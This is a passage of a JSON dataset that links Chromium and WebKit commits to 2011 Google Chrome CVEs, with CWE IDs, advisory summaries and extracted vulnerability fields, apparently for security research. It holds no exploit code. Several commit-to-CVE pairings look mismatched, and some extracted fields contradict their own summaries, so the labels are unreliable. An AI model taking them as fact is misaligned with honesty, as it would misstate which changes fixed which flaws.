crafted document that triggers an incorrect read operation.","commit_message_1":"devtools : move devtoolsagent\/client into content","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted document that triggers an incorrect read operation","Impact":"have an unspecified impact","Root Cause":"does not properly handle strings","Attack Type":"remote attacker"},{"commit_id":"5b65968b6c64fa02e74ca6b965bf5998b911e826","cve_id":"CVE-2011-2864","cwe_id":"CWE-119","commit_message":"Fix compile warning.\n\n\nBUG=none\nTEST=none\n\n\nReview URL: http:\/\/codereview.chromium.org\/7572039\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@95563 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 does not properly handle Tibetan characters, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"fix compile warning","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle tibetan characters","Attack Type":"remote attacker"},{"commit_id":"c13e1da62b5f5f0e6fe8c1f769a5a28415415244","cve_id":"CVE-2011-2858","cwe_id":"CWE-119","commit_message":"Revert \"Revert 100494 - Fix bug in SimulateAttrib0.\"\"\"\n\nTEST=none\nBUG=95625\nTBR=apatrick@chromium.org\n\nReview URL: http:\/\/codereview.chromium.org\/7796016\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@100507 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 does not properly handle triangle arrays, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"revert `` revert <number> - fix bug in simulateattrib0","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle triangle arrays","Attack Type":"remote attacker"},{"commit_id":"a64c3cf0ab6da24a9a010a45ebe4794422d40c71","cve_id":"CVE-2011-2822","cwe_id":"CWE-20","commit_message":"Be a little more careful whether something is an URL or a file path.\n\nBUG=72492\nReview URL: http:\/\/codereview.chromium.org\/7572046\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@95731 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 13.0.782.215 on Windows does not properly parse URLs located on the command line, which has unspecified impact and attack vectors.","commit_message_1":"be a little more careful whether something is an url or a file path","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"execute arbitrary code","Root Cause":"does not properly parse urls located on the command line","Attack Type":"remote attacker"},{"commit_id":"c9911bc93097a5df5518f5b88e1d5ed5ef275a4d","cve_id":"CVE-2011-2821","cwe_id":"CWE-399","commit_message":"Fix libxml XPath bug.\n\nBUG=89402\nReview URL: http:\/\/codereview.chromium.org\/7508039\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@95382 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Double free vulnerability in libxml2, as used in Google Chrome before 13.0.782.215, allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted XPath expression.","commit_message_1":"fix libxml xpath bug","Vulnerability Type":"double free","Attack Vector":"via a crafted xpath expression","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by double-free error within libxml XPath handling","Attack Type":"remote attacker"},{"commit_id":"a4b20ed4917f1f6fc83b6375a48e2c3895d43a8a","cve_id":"CVE-2011-2829","cwe_id":"CWE-189","commit_message":"Add chromium_code: 1 to surface.gyp and gl.gyp to pick up -Werror.\n\nIt looks like this was dropped accidentally in http:\/\/codereview.chromium.org\/6718027 (surface.gyp) and http:\/\/codereview.chromium.org\/6722026 (gl.gyp)\n\nRemove now-redudant code that's implied by chromium_code: 1.\n\nFix the warnings that have crept in since chromium_code: 1 was removed.\n\nBUG=none\nTEST=none\n\n\nCommitted: http:\/\/src.chromium.org\/viewvc\/chrome?view=rev&revision=91598\n\nReview URL: http:\/\/codereview.chromium.org\/7227009\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@91813 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Integer overflow in Google Chrome before 13.0.782.215 on 32-bit platforms allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving uniform arrays.","commit_message_1":"<number> to <file> and <file> to pick up -werror","Vulnerability Type":"integer overflow","Attack Vector":"via vectors involving uniform arrays","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow related uniform arrays","Attack Type":"remote attacker"},{"commit_id":"9eb1fd426a04adac0906c81ed88f1089969702ba","cve_id":"CVE-2011-2358","cwe_id":"CWE-20","commit_message":"Adding tests for new webstore beginInstallWithManifest method.\n\nBUG=75821\nTEST=none\nReview URL: http:\/\/codereview.chromium.org\/6900059\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@83080 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 13.0.782.107 does not ensure that extension installations are confirmed by a browser dialog, which makes it easier for remote attackers to modify the product's functionality via a Trojan horse extension.","commit_message_1":"adding test for new webstore begininstallwithmanifest method","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a trojan horse extension","Impact":"modify the product ' s functionality","Root Cause":"does not ensure that extension installations are confirmed by a browser dialog","Attack Type":"remote attacker"},{"commit_id":"90509cbdde392aa218771f6673b9b5a6600c2b57","cve_id":"CVE-2011-2361","cwe_id":"CWE-287","commit_message":"Base: A few more files using BASE_API (for base.dll)\n\nBUG=76996\nTEST=none\nReview URL: http:\/\/codereview.chromium.org\/6733031\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@79426 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The Basic Authentication dialog implementation in Google Chrome before 13.0.782.107 does not properly handle strings, which might make it easier for remote attackers to capture credentials via a crafted web site.","commit_message_1":"a few more file using base_api ( for <file> ) bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Improper Authentication","Attack Vector":"via a crafted web site","Impact":"capture credentials","Root Cause":"does not properly handle strings , which might make it easier","Attack Type":"attacker"},{"commit_id":"20d1c99d9b53a0b2b419aae0075494a9d0b86daf","cve_id":"CVE-2011-2782","cwe_id":"CWE-264","commit_message":"Ensure URL is updated after a cross-site navigation is pre-empted by\nan \"ignored\" navigation.\n\nBUG=77507\nTEST=NavigationControllerTest.LoadURL_IgnorePreemptsPending\n\nReview URL: http:\/\/codereview.chromium.org\/6826015\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@81307 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The drag-and-drop implementation in Google Chrome before 13.0.782.107 on Linux does not properly enforce permissions for files, which allows user-assisted remote attackers to bypass intended access restrictions via unspecified vectors.","commit_message_1":"ensure url is updated after a cross-site navigation is pre-empted by an `` ignored '' navigation","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via unspecified vectors","Impact":"bypass intended access restrictions","Root Cause":"does not properly enforce permissions for files","Attack Type":"remote attacker"},{"commit_id":"5fb88938e3210391f8c948f127fd96d9c2979119","cve_id":"CVE-2011-2783","cwe_id":"CWE-20","commit_message":"Unrevert: Show the install dialog for the initial load of an unpacked extension\nwith plugins.\n\nFirst landing broke some browser tests.\n\nBUG=83273\nTEST=in the extensions managmenet page, with developer mode enabled, Load an unpacked extension on an extension with NPAPI plugins. You should get an install dialog.\nTBR=mihaip\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@87738 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 13.0.782.107 does not ensure that developer-mode NPAPI extension installations are confirmed by a browser dialog, which makes it easier for remote attackers to modify the product's functionality via a Trojan horse extension.","commit_message_1":"show the install dialog for the initial load of an unpacked extension with plugins","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a trojan horse extension","Impact":"modify the product ' s functionality","Root Cause":"does not ensure that developer - mode npapi extension installations are confirmed by a browser dialog","Attack Type":"remote attacker"},{"commit_id":"225e7438996c9c939bd239376dfa93e562972cf8","cve_id":"CVE-2011-2784","cwe_id":"CWE-200","commit_message":"Update PrerenderBrowserTests to work with new\nPrerenderContents.\n\nAlso update PrerenderContents to pass plugin\nand HTML5 prerender tests.\n\nBUG=81229\nTEST=PrerenderBrowserTests (Once the new code is enabled)\n\nReview URL: http:\/\/codereview.chromium.org\/6905169\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@83841 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 13.0.782.107 allows remote attackers to obtain sensitive information via a request for the GL program log, which reveals a local path in an unspecified log entry.","commit_message_1":"update prerenderbrowsertests to work with new prerendercontents","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a request for the gl program log , which reveals a local path in an unspecified log entry","Impact":"obtain sensitive information","Root Cause":"reveals a local path","Attack Type":"remote attacker"},{"commit_id":"697cd7e2ce2535696f1b9e5cfb474cc36a734747","cve_id":"CVE-2011-2785","cwe_id":"CWE-20","commit_message":"Prevent extensions from defining homepages with schemes other than valid web extents.\n\nBUG=84402\nTEST=ExtensionManifestTest.ParseHomepageURLs\nReview URL: http:\/\/codereview.chromium.org\/7089014\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@87722 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The extensions implementation in Google Chrome before 13.0.782.107 does not properly validate the URL for the home page, which allows remote attackers to have an unspecified impact via a crafted extension.","commit_message_1":"prevent extension from defining homepage with scheme other than valid web extent","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted extension","Impact":"have an unspecified impact","Root Cause":"does not properly validate the url for the home page","Attack Type":"remote attacker"},{"commit_id":"9400c64565586091f67d4131850fd0836b18b511","cve_id":"CVE-2011-2787","cwe_id":"CWE-399","commit_message":"Fix a lock re-entry bug in GpuDataManager::UpdateGpuInfo.\n\nThe issue is that the registered callbacks could request GPUInfo, so they could re-enter the lock.  Therefore, we should release the lock before we run through callbacks.\n\nBUG=84805\nTEST=the issue in 84805 is gone.\nReview URL: http:\/\/codereview.chromium.org\/7054063\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@87898 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 13.0.782.107 does not properly address re-entrancy issues associated with the GPU lock, which allows remote attackers to cause a denial of service (application crash) via unspecified vectors.","commit_message_1":"fix a lock re-entry bug in gpudatamanager : :updategpuinfo","Vulnerability Type":"Resource Management Errors","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( application crash )","Root Cause":"does not properly address re - entrancy issues associated with the gpu lock","Attack Type":"remote attacker"},{"commit_id":"55ef04e135edaa9abfbf3647634b11ed57dc49e9","cve_id":"CVE-2011-2789","cwe_id":"CWE-399","commit_message":"Maintain a map of all resources in the resource tracker and clear instance back pointers when needed,\n\nBUG=85808\nReview URL: http:\/\/codereview.chromium.org\/7196001\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@89746 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 13.0.782.107 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to instantiation of the Pepper plug-in.","commit_message_1":"maintain a map of all resource in the resource tracker and clear instance back pointer when needed , bug=<number> review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to instantiation of the pepper plug - in","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within Pepper plug-in instantiation","Attack Type":"remote attacker"},{"commit_id":"adb3498ca0b69561d8c6b60bab641de4b0e37dbf","cve_id":"CVE-2011-2790","cwe_id":"CWE-399","commit_message":"[wx] Fix strokeArc and fillRoundedRect drawing, and add clipPath support.","summary":"Use-after-free vulnerability in Google Chrome before 13.0.782.107 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving floating styles.","commit_message_1":"fix strokearc and fillroundedrect drawing , and add clippath support","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving floating styles","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within floating styles","Attack Type":"remote attacker"},{"commit_id":"a6e146b4a369b31afa4c4323cc813dcbe0ef0c2b","cve_id":"CVE-2011-2793","cwe_id":"CWE-399","commit_message":"Use URLFetcher::Create instead of new in http_bridge.cc.\n\n This change modified http_bridge so that it uses a factory to construct\nthe URLFetcher. Moreover, it modified sync_backend_host_unittest.cc to\nuse an URLFetcher factory which will prevent access to www.example.com during\nthe test.\n\nBUG=none\nTEST=sync_backend_host_unittest.cc\n\nReview URL: http:\/\/codereview.chromium.org\/7053011\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@87227 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 13.0.782.107 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to media selectors.","commit_message_1":"instead of new in <file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to media selectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within media selectors","Attack Type":"remote attacker"},{"commit_id":"3057be01bcbbd1d0938afb489e18f2ca6d9b8229","cve_id":"CVE-2011-2794","cwe_id":"CWE-119","commit_message":"Remove minimum and maximum scroll position as they are no\nlonger required due to changes in ScrollViewBase.\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=87298\n\nPatch by Genevieve Mak <gmak@rim.com> on 2012-05-23\nReviewed by Antonio Gomes.\n\n* WebKitSupport\/InRegionScrollableArea.cpp:\n(BlackBerry::WebKit::InRegionScrollableArea::InRegionScrollableArea):\n* WebKitSupport\/InRegionScrollableArea.h:\n(InRegionScrollableArea):\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@118233 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 13.0.782.107 does not properly perform text iteration, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"remove minimum and maximum scroll position a they are no longer required due to change in scrollviewbase","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly perform text iteration","Attack Type":"remote attacker"},{"commit_id":"73edae623529f04c668268de49d00324b96166a2","cve_id":"CVE-2011-2795","cwe_id":"CWE-264","commit_message":"There are too many poorly named functions to create a fragment from markup\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=87339\n\nReviewed by Eric Seidel.\n\nSource\/WebCore:\n\nMoved all functions that create a fragment from markup to markup.h\/cpp.\nThere should be no behavioral change.\n\n* dom\/Range.cpp:\n(WebCore::Range::createContextualFragment):\n* dom\/Range.h: Removed createDocumentFragmentForElement.\n* dom\/ShadowRoot.cpp:\n(WebCore::ShadowRoot::setInnerHTML):\n* editing\/markup.cpp:\n(WebCore::createFragmentFromMarkup):\n(WebCore::createFragmentForInnerOuterHTML): Renamed from createFragmentFromSource.\n(WebCore::createFragmentForTransformToFragment): Moved from XSLTProcessor.\n(WebCore::removeElementPreservingChildren): Moved from Range.\n(WebCore::createContextualFragment): Ditto.\n* editing\/markup.h:\n* html\/HTMLElement.cpp:\n(WebCore::HTMLElement::setInnerHTML):\n(WebCore::HTMLElement::setOuterHTML):\n(WebCore::HTMLElement::insertAdjacentHTML):\n* inspector\/DOMPatchSupport.cpp:\n(WebCore::DOMPatchSupport::patchNode): Added a FIXME since this code should be using\none of the functions listed in markup.h\n* xml\/XSLTProcessor.cpp:\n(WebCore::XSLTProcessor::transformToFragment):\n\nSource\/WebKit\/qt:\n\nReplace calls to Range::createDocumentFragmentForElement by calls to\ncreateContextualDocumentFragment.\n\n* Api\/qwebelement.cpp:\n(QWebElement::appendInside):\n(QWebElement::prependInside):\n(QWebElement::prependOutside):\n(QWebElement::appendOutside):\n(QWebElement::encloseContentsWith):\n(QWebElement::encloseWith):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@118414 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 13.0.782.107 does not prevent calls to functions in other frames, which allows remote attackers to bypass intended access restrictions via a crafted web site, related to a *cross-frame function leak.*","commit_message_1":"there are too many poorly named function to create a fragment from markup http : \/\/<file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted web site , related to a * cross - frame function leak","Impact":"bypass intended access restrictions","Root Cause":"does not prevent calls to functions","Attack Type":"remote attacker"},{"commit_id":"80742f2ffeb9e90cd85cbee27acb9f924ffebd16","cve_id":"CVE-2011-2797","cwe_id":"CWE-399","commit_message":"Add support for the \"uploadrequired\" attribute for Autofill query responses\n\nBUG=84693\nTEST=unit_tests --gtest_filter=AutofillDownloadTest.QueryAndUploadTest\n\nReview URL: http:\/\/codereview.chromium.org\/6969090\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@87729 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 13.0.782.107 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to resource caching.","commit_message_1":"add support for the `` uploadrequired '' attribute for autofill query response bug=<number> review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to resource caching","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within resource caching","Attack Type":"remote attacker"},{"commit_id":"ce891a86763d3540e2612be26938a6163310efe0","cve_id":"CVE-2011-2798","cwe_id":"CWE-264","commit_message":"Prevent navigation to chrome-devtools: and chrome-internal: schemas from http\n\nBUG=87815\nReview URL: http:\/\/codereview.chromium.org\/7275032\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@91002 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 13.0.782.107 does not properly restrict access to internal schemes, which allows remote attackers to have an unspecified impact via a crafted web site.","commit_message_1":"and chrome-internal : schema from http bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted web site","Impact":"have an unspecified impact","Root Cause":"does not properly restrict access to internal schemes","Attack Type":"remote attacker"},{"commit_id":"5a2de6455f565783c73e53eae2c8b953e7d48520","cve_id":"CVE-2011-2799","cwe_id":"CWE-399","commit_message":"2011-06-02  Joone Hur  <joone.hur@collabora.co.uk>\n\n        Reviewed by Martin Robinson.\n\n        [GTK] Only load dictionaries if spell check is enabled\n        https:\/\/bugs.webkit.org\/show_bug.cgi?id=32879\n\n        We don't need to call enchant if enable-spell-checking is false.\n\n        * webkit\/webkitwebview.cpp:\n        (webkit_web_view_update_settings): Skip loading dictionaries when enable-spell-checking is false.\n        (webkit_web_view_settings_notify): Ditto.\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@87925 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 13.0.782.107 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to HTML range handling.","commit_message_1":"joone hur < <file> @ <file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to html range handling","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within when handling HTML range","Attack Type":"remote attacker"},{"commit_id":"48f2ec5c24570c9b96bb2798a9ffe956117c5066","cve_id":"CVE-2011-2803","cwe_id":"CWE-119","commit_message":"Add OVERRIDE to ui::TreeModelObserver overridden methods.\n\nBUG=None\nTEST=None\n\nR=sky@chromium.org\n\nReview URL: http:\/\/codereview.chromium.org\/7046093\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@88827 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 13.0.782.107 does not properly handle Skia paths, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"overridden method","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle skia paths","Attack Type":"remote attacker"},{"commit_id":"f837b6744eb9ca9d8e4f2e93d9118bf787ca5e24","cve_id":"CVE-2011-2801","cwe_id":"CWE-399","commit_message":"Now ignores obsolete sync nodes without visit transitions.\n\nAlso removed assertion that was erroneously triggered by obsolete sync nodes.\n\nBUG=none\nTEST=run chrome against a database that contains obsolete typed url sync nodes.\n\nReview URL: http:\/\/codereview.chromium.org\/7129069\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@88846 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 13.0.782.107 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the frame loader.","commit_message_1":"now ignores obsolete sync node without visit transition","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the frame loader","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within frame loader","Attack Type":"remote attacker"},{"commit_id":"456405f87033ee64c6862ef814f1f6a4e52585bd","cve_id":"CVE-2011-2818","cwe_id":"CWE-399","commit_message":"Initial implementation of DisconnectWindow on Linux.\n\n\nBUG=None\nTEST=Manual\n\n\nReview URL: http:\/\/codereview.chromium.org\/7089016\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@88889 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 13.0.782.107 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to display box rendering.","commit_message_1":"initial implementation of disconnectwindow on linux","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to display box rendering ","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within display box rendering","Attack Type":"remote attacker"},{"commit_id":"dc7b094a338c6c521f918f478e993f0f74bbea0d","cve_id":"CVE-2011-2804","cwe_id":"CWE-399","commit_message":"Remove use of libcros from InputMethodLibrary.\n\nBUG=chromium-os:16238\nTEST==confirm that input methods work as before on the netbook. Also confirm that the chrome builds and works on the desktop as before.\n\nReview URL: http:\/\/codereview.chromium.org\/7003086\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@89142 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 13.0.782.107 does not properly handle nested functions in PDF documents, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted document.","commit_message_1":"remove use of libcros from inputmethodlibrary","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted document","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"does not properly handle nested functions","Attack Type":"remote attacker"},{"commit_id":"bf04ad0dae9f4f479f90fd2b38f634ffbaf434b4","cve_id":"CVE-2011-2345","cwe_id":"CWE-119","commit_message":"Fix invalid read in ppapi code\n\nBUG=77493\nTEST=attached test\n\nReview URL: http:\/\/codereview.chromium.org\/6883059\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@82172 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The NPAPI implementation in Google Chrome before 12.0.742.112 does not properly handle strings, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"fix invalid read in ppapi code bug=<number> review url : http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle strings","Attack Type":"remote attacker"},{"commit_id":"dabd6f450e9594a8962ef6f79447a8bfdc1c9f05","cve_id":"CVE-2011-2346","cwe_id":"CWE-399","commit_message":"wstring: remove wstring version of SplitString\n\nRetry of r84336.\n\nBUG=23581\n\nReview URL: http:\/\/codereview.chromium.org\/6930047\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@84355 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 12.0.742.112 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving SVG fonts.","commit_message_1":"remove wstring version of splitstring retry of r84336","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving svg fonts","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error when handling SVG font","Attack Type":"remote attacker"},{"commit_id":"60cc89e8d2e761dea28bb9e4cf9ebbad516bff09","cve_id":"CVE-2011-2347","cwe_id":"CWE-119","commit_message":"iwyu: Include callback_old.h where appropriate, final.\n\nBUG=82098\nTEST=none\n\nReview URL: http:\/\/codereview.chromium.org\/7003003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@85003 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 12.0.742.112 does not properly handle Cascading Style Sheets (CSS) token sequences, which allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"include <file> where appropriate , final","Vulnerability Type":"buffer overflow","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"does not properly handle cascading style sheets ( css ) token sequences","Attack Type":"remote attacker"},{"commit_id":"b944f670bb7a8a919daac497a4ea0536c954c201","cve_id":"CVE-2011-2350","cwe_id":"CWE-20","commit_message":"[JSC] Implement a helper method createNotEnoughArgumentsError()\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=85102\n\nReviewed by Geoffrey Garen.\n\nIn bug 84787, kbr@ requested to avoid hard-coding\ncreateTypeError(exec, \"Not enough arguments\") here and there.\nThis patch implements createNotEnoughArgumentsError(exec)\nand uses it in JSC bindings.\n\nc.f. a corresponding bug for V8 bindings is bug 85097.\n\nSource\/JavaScriptCore:\n\n* runtime\/Error.cpp:\n(JSC::createNotEnoughArgumentsError):\n(JSC):\n* runtime\/Error.h:\n(JSC):\n\nSource\/WebCore:\n\nTest: bindings\/scripts\/test\/TestObj.idl\n\n* bindings\/scripts\/CodeGeneratorJS.pm: Modified as described above.\n(GenerateArgumentsCountCheck):\n\n* bindings\/js\/JSDataViewCustom.cpp: Ditto.\n(WebCore::getDataViewMember):\n(WebCore::setDataViewMember):\n* bindings\/js\/JSDeprecatedPeerConnectionCustom.cpp:\n(WebCore::JSDeprecatedPeerConnectionConstructor::constructJSDeprecatedPeerConnection):\n* bindings\/js\/JSDirectoryEntryCustom.cpp:\n(WebCore::JSDirectoryEntry::getFile):\n(WebCore::JSDirectoryEntry::getDirectory):\n* bindings\/js\/JSSharedWorkerCustom.cpp:\n(WebCore::JSSharedWorkerConstructor::constructJSSharedWorker):\n* bindings\/js\/JSWebKitMutationObserverCustom.cpp:\n(WebCore::JSWebKitMutationObserverConstructor::constructJSWebKitMutationObserver):\n(WebCore::JSWebKitMutationObserver::observe):\n* bindings\/js\/JSWorkerCustom.cpp:\n(WebCore::JSWorkerConstructor::constructJSWorker):\n\n* bindings\/scripts\/test\/JS\/JSFloat64Array.cpp: Updated run-bindings-tests.\n(WebCore::jsFloat64ArrayPrototypeFunctionFoo):\n* bindings\/scripts\/test\/JS\/JSTestActiveDOMObject.cpp:\n(WebCore::jsTestActiveDOMObjectPrototypeFunctionExcitingFunction):\n(WebCore::jsTestActiveDOMObjectPrototypeFunctionPostMessage):\n* bindings\/scripts\/test\/JS\/JSTestCustomNamedGetter.cpp:\n(WebCore::jsTestCustomNamedGetterPrototypeFunctionAnotherFunction):\n* bindings\/scripts\/test\/JS\/JSTestEventTarget.cpp:\n(WebCore::jsTestEventTargetPrototypeFunctionItem):\n(WebCore::jsTestEventTargetPrototypeFunctionAddEventListener):\n(WebCore::jsTestEventTargetPrototypeFunctionRemoveEventListener):\n(WebCore::jsTestEventTargetPrototypeFunctionDispatchEvent):\n* bindings\/scripts\/test\/JS\/JSTestInterface.cpp:\n(WebCore::JSTestInterfaceConstructor::constructJSTestInterface):\n(WebCore::jsTestInterfacePrototypeFunctionSupplementalMethod2):\n* bindings\/scripts\/test\/JS\/JSTestMediaQueryListListener.cpp:\n(WebCore::jsTestMediaQueryListListenerPrototypeFunctionMethod):\n* bindings\/scripts\/test\/JS\/JSTestNamedConstructor.cpp:\n(WebCore::JSTestNamedConstructorNamedConstructor::constructJSTestNamedConstructor):\n* bindings\/scripts\/test\/JS\/JSTestObj.cpp:\n(WebCore::JSTestObjConstructor::constructJSTestObj):\n(WebCore::jsTestObjPrototypeFunctionVoidMethodWithArgs):\n(WebCore::jsTestObjPrototypeFunctionIntMethodWithArgs):\n(WebCore::jsTestObjPrototypeFunctionObjMethodWithArgs):\n(WebCore::jsTestObjPrototypeFunctionMethodWithSequenceArg):\n(WebCore::jsTestObjPrototypeFunctionMethodReturningSequence):\n(WebCore::jsTestObjPrototypeFunctionMethodThatRequiresAllArgsAndThrows):\n(WebCore::jsTestObjPrototypeFunctionSerializedValue):\n(WebCore::jsTestObjPrototypeFunctionIdbKey):\n(WebCore::jsTestObjPrototypeFunctionOptionsObject):\n(WebCore::jsTestObjPrototypeFunctionAddEventListener):\n(WebCore::jsTestObjPrototypeFunctionRemoveEventListener):\n(WebCore::jsTestObjPrototypeFunctionMethodWithNonOptionalArgAndOptionalArg):\n(WebCore::jsTestObjPrototypeFunctionMethodWithNonOptionalArgAndTwoOptionalArgs):\n(WebCore::jsTestObjPrototypeFunctionMethodWithCallbackArg):\n(WebCore::jsTestObjPrototypeFunctionMethodWithNonCallbackArgAndCallbackArg):\n(WebCore::jsTestObjPrototypeFunctionOverloadedMethod1):\n(WebCore::jsTestObjPrototypeFunctionOverloadedMethod2):\n(WebCore::jsTestObjPrototypeFunctionOverloadedMethod3):\n(WebCore::jsTestObjPrototypeFunctionOverloadedMethod4